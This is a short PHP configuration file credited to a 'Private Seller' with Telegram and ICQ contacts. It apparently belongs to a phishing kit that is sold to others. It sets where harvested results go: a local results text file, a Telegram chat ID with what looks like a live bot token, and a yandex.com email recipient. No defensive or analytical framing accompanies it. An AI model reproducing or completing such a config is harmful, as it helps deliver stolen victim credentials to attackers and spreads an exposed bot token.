<?php
/*
Author : Private Seller
ICQ : @pseller200
https://t.me/pseller200
*/

 
// result

$result = "../zabXnsDss.txt";



// telegram

$chat = "754634607";
$token = "7671672791:AAHDTZm89aov3B3aYDuSSeIUgKj2oA2bCxs";


// email

$to = "@yandex.com";


?>